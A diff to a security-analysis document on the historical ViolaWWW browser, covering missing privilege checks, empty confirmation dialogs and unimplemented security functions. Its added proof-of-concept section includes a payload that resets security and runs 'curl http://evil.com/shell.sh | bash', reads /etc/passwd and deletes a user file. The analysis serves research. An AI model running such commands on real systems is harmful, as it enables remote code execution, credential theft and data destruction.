@@ -182,6 +182,42 @@ if (securityMode == 0)  // One-way door
 2. All future objects created with `security = 1`
 3. Security mode cannot be reset to safe state
 
+### Proof of Concept Attack Chain
+
+A complete attack requires only three steps:
+
+**Step 1**: Victim opens a page containing:
+```html
+<vobjf href="http://evil.com/payload.v">Click here</vobjf>
+```
+
+**Step 2**: `payload.v` contains:
+```javascript
+\class {generic}
+\name {evil}
+\script {
+    // Privilege escalation - single line!
+    set("security", 0);
+    
+    // Now we have full access:
+    system("curl http://evil.com/shell.sh | bash");
+    loadFile("/etc/passwd");
+    deleteFile("/home/victim/important.doc");
+    environVar("HOME");  // Read environment
+}
+```
+
+**Step 3**: Attacker has complete control.
+
+### Why These Attacks Work
+
+| Vulnerability | Root Cause |
+|--------------|------------|
+| `set("security", 0)` works | No `notSecure()` check before `helper_setSecurity()` |
+| `loadObjFile()` works | No `notSecure()` check in `meth_cosmic_loadObjFile()` |
+| No confirmation dialogs | `wwwDialog_confirm` is empty, others don't exist |
+| No caller authentication | Only comments, no implementation |
+
 ## HTML Tag Security
 
 ### Active Tags
@@ -192,25 +228,243 @@ Tags that create interactive objects:
 - `<FORM>`, `<INPUT>` - Form elements with event handling
 - `<A>` - Links with navigation scripts
 
+## Author's Own Acknowledgments
+
+The original developer left explicit comments acknowledging the incomplete state of the security system:
+
+### "Terribly Lay Back" Security Wall
+
+In `wwwSecurity_script.v`:
+
+```javascript
+/* this security wall is terribly lay back now */
+```
+
+This comment directly admits the security implementation is inadequate.
+
+### Missing Authentication
+
+In the same file, when handling file operations:
+
+```javascript
+case "getDocAndMoveItToSpecifiedPlace":
+    /* this is call by HTML__doc. Need a way to autheticate
+     * that it's indeed HTML__doc that's calling ...
+     */
+    // No authentication implemented - just executes the command!
+    system(concat("mv ", dumpFile, " ", arg[2]));
+```
+
+### Missing Confirmation Dialog
+
+```javascript
+if (access(arg[2])) {
+    /* should query to confirm */
+    print("Warning: overwriting ", arg[2], "...\n");
+}
+```
+
+Instead of a confirmation dialog, only a console warning is printed.
+
+### Incomplete Multi-Level Scheme
+
+In `class.c`:
+
+```c
+/* is securityMode > 0 (unsure), then override original object's
+ * security rating. note: this code is secure only for 2 levels scheme.
+ */
+```
+
+The author explicitly notes uncertainty (`unsure`) and that the code only works for a two-level security scheme.
+
+## Unimplemented Security Functions
+
+### Empty Security Handlers in `mvw_script3.v`
+
+Three security functions are defined with comments but contain no implementation:
+
+```javascript
+case "queryDocSecurity":
+    /* for interface to get doc level security level */
+break;  // Empty!
+
+case "setSecurityClearence":
+    /* coming from interace */
+break;  // Empty!
+
+case "querySecurityClearence":
+    /* send to interface */
+break;  // Empty!
+```
+
+These were intended to provide:
+- **queryDocSecurity**: Query document security level
+- **setSecurityClearence**: Set user clearance level
+- **querySecurityClearence**: Check user clearance
+
+None of these are implemented.
+
+## Missing Security Dialogs
+
+### Empty Confirmation Dialog
+
+The `wwwDialog_confirm` object exists but is completely empty:
+
+**File**: `embeds/wwwDialog_confirm_script.v`
+```javascript
+switch (arg[0]) {
+case "confirm":
+break;  // No implementation!
+}
+usual();
+```
+
+This dialog should:
+- Display a message to the user
+- Ask for Yes/No confirmation
+- Return the result
+
+Instead, it does nothing and returns nothing.
+
+### Non-Existent Dialog Objects
+
+The following dialogs are **called** in code but **do not exist**:
+
+| Dialog | Purpose | Status |
+|--------|---------|--------|
+| `wwwDialog_confirm` | Yes/No confirmation | ⚠️ Empty stub |
+| `wwwDialog_prompt_default` | Text input with default | ❌ Does not exist |
+| `wwwDialog_prompt_password` | Password input | ❌ Does not exist |
+| `wwwDialog_prompt_username_and_password` | Login dialog | ❌ Does not exist |
+
+These are called from `www_script318.v`:
+
+```javascript
+case "dialog_confirm":
+    return wwwDialog_confirm("confirm", arg[1]);  // Calls empty stub
+case "dialog_prompt_default":
+    return wwwDialog_prompt_default("prompt", arg[1], arg[2]);  // Object doesn't exist!
+case "dialog_prompt_password":
+    return wwwDialog_prompt_password("prompt", arg[1]);  // Object doesn't exist!
+```
+
+### Unused Ready-Made Dialog
+
+A fully functional `res.dialogWithButtons` exists and is used for error messages, but is **not used** for security confirmations:
+
+```javascript
+// Used for author contact messages, but NOT for security:
+res.dialogWithButtons("show", "The declared author contact is...", "Dismiss", "");
+```
+
+## The `<SECURITY>` Tag Ghost
+
+### Defined in DTD
+
+```c
+// In HTMLDTD.c:
+static attr security_attr[] = {{"LEVEL"}, {0}};
+{"SECURITY", security_attr, HTML_SECURITY_ATTRIBUTES, SGML_EMPTY, 0, 0},
+```
+
+### Registered in Stylesheet
+
+```
+// In HTML_style.c:
+SECURITY	HTML_security		1 0 0 0 0		0 0 0 0
+```
+
+### Object Does Not Exist
+
+The `HTML_security` object is **never defined** in `objs.c`. When the parser encounters `<SECURITY LEVEL="high">`:
+
+1. Parser looks for object `HTML_security`
+2. Object not found
+3. Tag is silently ignored
+
 ## Implementation Status
 
-The security system appears incomplete:
+The security system is **fundamentally incomplete**:
 
 ### Implemented Features
 - Basic object-level security attributes
-- Privilege checking for core operations
+- Privilege checking for core operations (partial)
 - Global security mode
 - HTML tag processing
+
+### Partially Implemented
+| Component | Status |
+|-----------|--------|
+| `notSecure()` function | ✅ Works |
+| Protected operations list | ⚠️ Incomplete (missing checks) |
+| `securityMode()` | ⚠️ One-way trap |
+| `wwwSecurity` object | ⚠️ "Terribly lay back" |
+
+### Not Implemented
+| Component | Status |
+|-----------|--------|
+| `<SECURITY>` tag handler | ❌ Object missing |
+| `queryDocSecurity()` | ❌ Empty stub |
+| `setSecurityClearence()` | ❌ Empty stub |
+| `querySecurityClearence()` | ❌ Empty stub |
+| `wwwDialog_confirm` | ❌ Empty stub |
+| `wwwDialog_prompt_*` | ❌ Objects missing |
+| Caller authentication | ❌ Only comment |
+| File overwrite confirmation | ❌ Only print() |
+
+### Missing Security Checks
+
+The following critical functions lack `notSecure()` checks:
+
+```c
+// loadObjFile - can load arbitrary .v files
+long meth_cosmic_loadObjFile(VObj* self, ...) {
+    // No notSecure(self) check!
+    result->info.i = load_object(fname, path);
+}
+
+// set("security") - can elevate privileges
+case STR_security:
+    // No notSecure(self) check!
+    helper_setSecurity(self, result->info.i);
+```
 
 ### Missing Features
 - Sandboxing for loaded content
 - Content validation
 - Secure script execution
 - Network request filtering
+- User confirmation dialogs
+- Authentication mechanisms
 
-### Incomplete Tags
-- `<SECURITY>` tag defined but unimplemented
-- DTD attributes present but unused
+## libWWW Security Flag
+
+The libWWW library includes a separate security mechanism:
+
+### HTSecure Flag
+
+```c
+// In HTAccess.c:
+PUBLIC BOOL HTSecure = NO;     /* Disable access for telnet users? */
+```
+
+This flag is intended to restrict dangerous operations for telnet-connected users, but:
+
+- **Disabled by default** (`NO`)
+- Only affects telnet hopping prevention
+- **Not connected** to Viola's object security system
+
+```c
+// In HTTelnet.c:
+/* If the person is already telnetting etc, forbid hopping */
+/* This is a security precaution, for us and remote site */
+if (HTSecure) {
+    // Block telnet hopping
+}
+```
+
+This is a separate, limited security mechanism that does not integrate with the main Viola security model.
 
 ## Historical Context
 
@@ -220,15 +474,36 @@ ViolaWWW was developed in 1992-1994, predating modern web security concepts:
 - **Trust-based model**: Assumes benign content
 - **Object-oriented security**: Novel approach for the era
 - **Incomplete implementation**: Security features not fully developed
+- **Abandoned before completion**: Project ended ~1994-1995
 
 ## Modern Security Comparison
 
-Contemporary browsers implement:
+### Feature Comparison
 
-- **Process isolation**: Content runs in separate processes
-- **Capability-based security**: Explicit permission grants
-- **Content Security Policy**: Script and resource restrictions
-- **Same-origin policy**: Cross-origin request restrictions
+| Security Mechanism | ViolaWWW (1992) | Modern Browsers |
+|-------------------|-----------------|-----------------|
+| Sandboxing | ❌ None | ✅ Separate processes |
+| Same-origin policy | ❌ None | ✅ Strict isolation |
+| Content Security Policy | ❌ None | ✅ Script restrictions |
+| Permission system | ❌ Object attribute only | ✅ Explicit user grants |
+| File system access | 🔓 Full access | ✅ Isolated/sandboxed |
+| Privilege checks | ⚠️ Bypassable | ✅ Cryptographic |
+| Confirmation dialogs | ❌ Not implemented | ✅ Required for sensitive ops |
+| Script execution | 🔓 Full privileges | ✅ Restricted context |
+
+### Architectural Differences
+
+**ViolaWWW (1992)**:
+- Single-process architecture
+- Trust-based model (content assumed benign)
+- Object-level security attributes
+- Security checks at function level (incomplete)
+
+**Modern Browsers (2020s)**:
+- Multi-process architecture (renderer, GPU, network isolated)
+- Zero-trust model (all content potentially hostile)
+- Capability-based permissions
+- Hardware-enforced isolation (Site Isolation)
 
 ViolaWWW's security model is fundamentally incompatible with modern web security requirements.
 
@@ -241,6 +516,56 @@ For educational/research purposes only:
 3. **Consider the system as having no security boundaries**
 4. **Use in isolated environments only**
 
+## Source Code References
+
+Key files for security implementation:
+
+| File | Purpose |
+|------|---------|
+| `src/viola/cl_cosmic.c` | `notSecure()` function, `loadObjFile()` |
+| `src/viola/cl_generic.c` | `set("security")`, `securityMode()`, `helper_setSecurity()` |
+| `src/viola/class.c` | Security inheritance during clone/create |
+| `src/viola/sgml.c` | `SET_security(obj, 1)` for HTML objects |
+| `src/viola/obj.c` | Global `securityMode` variable |
+| `src/viola/embeds/wwwSecurity_script.v` | Security wall object (incomplete) |
+| `src/viola/embeds/mvw_script3.v` | Empty security handlers |
+| `src/viola/embeds/wwwDialog_confirm_script.v` | Empty confirmation dialog |
+| `src/libWWW/HTMLDTD.c` | `<SECURITY>` tag definition |
+| `src/viola/HTML_style.c` | `HTML_security` object mapping (missing) |
+
 ## Conclusion
 
-ViolaWWW's security architecture represents an early attempt at web security but suffers from critical design flaws and incomplete implementation. The system provides illusory protection while actually offering minimal security against determined attackers. Its design reflects the security assumptions of the early web, where content was generally trusted and malicious intent was not a primary concern.
+ViolaWWW's security architecture represents an early attempt at web security but suffers from critical design flaws and **fundamentally incomplete implementation**. 
+
+### What Was Planned
+
+The architecture reveals an ambitious security system design:
+- Document-level security levels (`<SECURITY LEVEL=...>`)
+- User clearance system (`setSecurityClearence`, `querySecurityClearence`)
+- Confirmation dialogs for dangerous operations
+- Caller authentication for privileged operations
+- Multi-level security scheme
+
+### What Was Built
+
+Only a skeleton was implemented:
+- Basic `security` attribute on objects
+- `notSecure()` check function (but not universally applied)
+- `securityMode` global (with one-way trap bug)
+- Empty stubs for security functions
+- Comments describing intended functionality
+
+### The Reality
+
+The system provides **illusory protection**:
+- Any object can elevate itself to `security = 0` with one line of code
+- Critical functions lack security checks
+- All confirmation dialogs are empty or missing
+- No authentication mechanisms exist
+
+The author's own comment summarizes it best:
+
+> *"this security wall is terribly lay back now"*
+> — `wwwSecurity_script.v`
+
+ViolaWWW was abandoned around 1994-1995 when Netscape and Internet Explorer dominated the market. The security system was never completed. For modern use, **treat ViolaWWW as having no security boundaries whatsoever**.
